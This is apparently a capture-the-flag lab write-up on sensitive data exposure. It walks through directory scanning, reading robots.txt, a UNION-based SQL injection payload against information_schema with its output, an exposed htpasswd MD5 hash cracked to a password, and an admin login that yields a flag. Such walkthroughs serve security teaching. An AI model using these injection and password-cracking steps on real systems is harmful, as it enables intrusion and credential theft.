# Sensitive_data_exposure

## Sensitive_data_exposure_explain

Generally, our sensitive information includes passwords, financial data, medical data, etc. Due to the unencrypted or incorrect protection of sensitive data in web applications or APIs, these data are easily exploited by attackers, and attackers may use these data to commit crimes. Behavior.

## Scan_website_path

    First one, i try scan website path using "Dirsearch".
    And i found a "/admin/" and "/robots.txt" that's interesting.

## /admin/

    We need a account to connect this page.

## /robots.txt

    A page content some information:
    User-agent: *
    Disallow: /whatever
    Disallow: /.hidden

## /whaterver
ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
Title: list_images
Url : id
ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
Title: list_images
Url : url
ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
Title: list_images
Url : title
ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
Title: list_images
Url : comment
    A index page content a "htpasswd" file.


## htpasswd
    A file content "root:8621ffdbc5698829397d97767ac13db3"
    8621ffdbc5698829397d97767ac13db3 -> MD5 hash -> after crack: dragon
    That i think is a admin account password

## Get_flag
    I trying connect to "admin" using "root" and "dragon".
    And finally, i get flag: d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff

## Solutions